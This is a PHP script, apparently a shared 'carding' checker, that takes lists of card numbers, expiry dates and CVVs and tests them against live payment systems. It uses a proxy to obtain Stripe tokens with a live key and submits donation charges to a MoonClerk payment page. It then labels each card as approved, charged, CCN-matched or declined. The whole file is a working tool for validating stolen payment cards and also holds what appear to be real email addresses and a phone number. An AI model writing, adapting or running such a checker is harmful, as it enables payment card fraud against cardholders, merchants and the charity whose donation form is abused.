<?php 
//////////////////////
//////////////

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[Randomizing Details Api]


$invoice = rand(000000,999999);
$name = ucfirst(str_shuffle('Kaptaan'));
$last = ucfirst(str_shuffle('saab'));
$first1 = str_shuffle("kaptaan0085246");
$serve_arr = array("gmail.com","hotmail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$first1."%40".$serv_rnd."";

$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$state = "New+York";
$zip = "10080";
$city = "New+York";
$street = "Street 76";
}
elseif ($state == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
$street = "Street 56";
}
elseif ($state == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
$street = "Street 70";
}
elseif ($state == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange+Park";
$street = "Street 64";
}
else{
$state = "California";
$zip = "90201";
$city = "Bell";
$street = "Street 46";
};



/*switch ($ano) {
  case '2031':
  $ano = '31';
  break;
  case '2030':
  $ano = '30';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
  case '2027':
  $ano = '27';
    break;
  case '2028':
  $ano = '28';
  break;
  case '2029':
  $ano = '29';
  break;
}
*/


$ip = array(
  1 => 'http://fi.proxiware.com:28000',
  2 => 'http://fi.proxiware.com:28000',
    ); 
    $socks = array_rand($ip);
    $p = $ip[$socks];


//$proxy_port = 28000;


/////////
//$proxy = 'http://us.proxiware.com:2000';
//$username = 'rahul';
//$password = 'rahul';





///////1st



/////////Main req

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'Accept: application/json',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://checkout.stripe.com',
'Referer: https://checkout.stripe.com/v3/GIQm89WqdPipo5cyACzNQ.html',
'Sec-Fetch-Mode: cors',
'sec-fetch-site: same-site',
 'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=Jack+cooper&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10080&guid=1161117f-a174-4a87-a73d-d780b28930aa11a021&muid=b5195db8-c680-4711-92ab-1da891313132033050&sid=76a4ae12-b4e1-400e-9918-799386a0088b701be4&payment_user_agent=stripe.js%2F7df5c2138%3B+stripe-js-v3%2F7df5c2138&time_on_page=140036&key=pk_live_4VRhmzVJRIlREvyaOF05DbB9&_stripe_account=acct_102opF2fOy8ULYr0&pasted_fields=number');

$result = curl_exec($ch);

 $token = GetStr($result, '"id":"','"');
 echo $token;
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://app.moonclerk.com/pay/7bj96o4wja6i');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host:app.moonclerk.com',   
   'accept: application/json, text/plain, */*',
   'X-Checkout-Signature:815f6NXl2U8WrGjEXuv7HXkIDcvvI8I5Tp1UiHArmK0=',
   'content-type: application/json;charset=UTF-8',
   'X-Requested-With: XMLHttpRequest',
   'X-CSRF-Token:zfo-UG-FDZpLM4pWdULat6tDQC9N89ugfLPSBAYx0w_H3KpphO6nhQ9C3moGQq6rav9FWM1dwjVunckPVRKFkw',
   'Origin:https://app.moonclerk.com',
   'referer: https://app.moonclerk.com/pay/7bj96o4wja6i?embed=true',
   'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36',
   'sec-fetch-mode: cors',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"checkout":{"amount_due_cents":1800,"coupon_amount_cents":0,"custom_id":null,"email":"dcmarveltg@gmail.com","embedded":true,"fee_applied_cents":1800,"fee_cents":0,"interval":"month","interval_count":1,"name":"Jack cooper","payment_strategy":"card","recurring":false,"starts_at":null,"subtotal_cents":1800,"terms_of_service_id":null,"total_cents":1800,"write_off_cents":0,"extension_responses_attributes":[],"custom_field_responses_attributes":[{"custom_field_id":652858,"kind":"text_field","title":"First Name","response":"Rahul"},{"custom_field_id":652859,"kind":"text_field","title":"Last Name","response":"Instinct"},{"custom_field_id":652860,"kind":"text_field","title":"Address","response":"West Ln 68"},{"custom_field_id":652861,"kind":"text_field","title":"City","response":"New York"},{"custom_field_id":652862,"kind":"select","title":"State/Province","response":"New York"},{"custom_field_id":652863,"kind":"text_field","title":"Zip/Postal Code","response":"10080"},{"custom_field_id":753377,"kind":"select","title":"Country","response":"United States"},{"custom_field_id":652864,"kind":"text_field","title":"Email","response":"rahulkumarprojects@gmail.com"},{"custom_field_id":652865,"kind":"text_field","title":"Tax Receipt Name","response":"Rahul "},{"custom_field_id":652866,"kind":"text_field","title":"Phone","response":"13218884413"}],"stripe_token":"'.$token.'"},"v":3}');

$result1 = curl_exec($ch);






/////////CARD RESPONSES /////////////
echo $result;
echo $result1;





if(strpos($result1, 'Thank you for your donation!' )) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}
elseif
(strpos($result1,  '"cvc_check": "pass"')) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「CVV AUTH」</span></br>';
}

elseif
(strpos($result1,  '"type": "stripe_3ds2_fingerprint"')) {
echo '<span class="badge badge-primary">#CCN</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「3DS2 SECURE CARD」</span></br>';
}

elseif
(strpos($result1,  '"status": "succeeded"')) {
echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}

elseif
(strpos($result1,  'Your card has insufficient funds.')) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-info">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「 Insufficient Funds 」</span></br>';
}

elseif
(strpos($result1,  "Thank You For Donation.")) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}
elseif
(strpos($result1,  '"Thank You For Donation."')) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}

elseif
(strpos($result1,  "Thank You.")) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';
}

elseif
(strpos($result1,  'Your card zip code is incorrect.')) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「 CVV AUTH 」</span></br>';
} 

elseif
(strpos($result1,  "incorrect_zip")) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「CVV AVS MISMATCH」</span></br>';
}


elseif
(strpos($result1,  '"type":"one-time"')) {
  echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「CVV AVS MISMATCH」</span></br>';
}

elseif(strpos($result, '"generic_decline"' )) {
    echo '<span class="badge badge-danger">Reprovadas</span> - </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-warning"> Generic Decline </span></br>';
}
elseif(strpos($result1, "Thank You For Donation." )) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';

}
elseif(strpos($result1, "Thank You." )) {
echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CHARGED (5$)」</span></br>';

}
elseif(strpos($result1,'expired_card')){
    echo '<span class="badge badge-primary">Reprovadas</span> ◈ </span> </span> <span class="badge badge-info">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「Expired card」</span></br>';

}
elseif(strpos($result1, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-info">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「 Insufficient Funds 」</span></br>';
}
elseif(strpos($result1, "insufficient_funds")) {
    echo '<span class="badge badge-primary">#Approved CVV</span> ◈ </span> </span> <span class="badge badge-info">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「 Insufficient Funds 」</span></br>';

}
elseif(strpos($result1, "security code is incorrect" )) {
    echo '<span class="badge badge-primary">#CCN</span> ◈ </span> </span> <span class="badge badge-primary">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「 CCN MATCHED 」</span></br>';

}
elseif(strpos($result1, "security code is invalid." )) {

    echo '<span class="badge badge-primary">#CCN</span> ◈ </span> </span> <span class="badge badge-primary">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「 CCN MATCHED 」</span></br>';

}

elseif(strpos($result, 'You do not have permission to perform this action' )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「 Proxy Dead」</span></br>';
}
elseif(strpos($result1, "incorrect_number" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-warning"> 「 Incorrect Card Number」</span></br>';
}
else {
    echo '<span class="badge badge-warning">Reprovadas</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger">「 '.$dcode.' - '.$code.' 」</span></br>';
}

curl_close($ch);
ob_flush();

///////// edited by @kaptaan00

